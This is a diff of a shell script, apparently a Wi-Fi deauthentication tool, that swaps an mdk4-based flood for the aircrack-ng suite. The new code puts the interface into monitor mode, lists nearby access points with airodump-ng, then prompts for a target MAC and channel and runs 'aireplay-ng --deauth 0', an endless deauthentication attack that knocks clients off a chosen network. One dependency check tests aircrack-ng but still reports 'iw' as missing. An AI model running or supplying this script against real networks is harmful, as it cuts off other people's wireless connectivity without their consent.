@@ -5,8 +5,7 @@ if [ "$(id -u)" -ne 0 ]; then
   exit 1
 fi
 
-command -v iw > /dev/null 2>&1 || { echo >&2 "I require iw but it's not installed. Install it. Aborting."; exit 1; }
-command -v mdk4 > /dev/null 2>&1 || { echo >&2 "I require mdk4 but it's not installed. Install it. Aborting."; exit 1; }
+command -v aircrack-ng > /dev/null 2>&1 || { echo >&2 "I require iw but it's not installed. Install it. Aborting."; exit 1; }
 
 usage() {
   echo "Usage: $0 IFACE"
@@ -18,24 +17,21 @@ if [ "$#" -ne 1 ]; then
   usage
 fi
 
-cleanup() {
-  pkill mdk4
-  rm MAC
-  iw dev mon0 del
-  exit 1
-}
-
-trap cleanup SIGINT SIGTERM SIGHUP SIGQUIT
-
 IFACE="$1"
 
-iwlist $IFACE scan | grep -E 'Address|ESSID' | sed 's/Cell//g' | tr -d ' ' | awk '1; NR % 2 == 0 { print "" }'
+deauth() {
+  echo -n "Enter target MAC address (e.g. FF:FF:FF:FF:FF:FF): "
+  read MAC
+  echo -n "Enter target channel (e.g. 11): "
+  read CH
 
-echo -n "Enter a MAC Address (e.g. FF:FF:FF:FF:FF:FF): "
-read MAC
+  trap "trap 'exit 1' SIGINT SIGTERM SIGHUP SIGQUIT; aireplay-ng --deauth 0 -a $MAC $IFACE" SIGINT SIGTERM SIGHUP SIGQUIT
 
-iw dev $IFACE interface add mon0 type monitor
+  airodump-ng --bssid $MAC --channel $CH $IFACE
+}
 
-iw dev $IFACE set power_save off
+trap deauth SIGINT SIGTERM SIGHUP SIGQUIT
 
-echo -n $MAC >MAC && mdk4 mon0 d -b MAC
+airmon-ng start $IFACE
+
+airodump-ng $IFACE
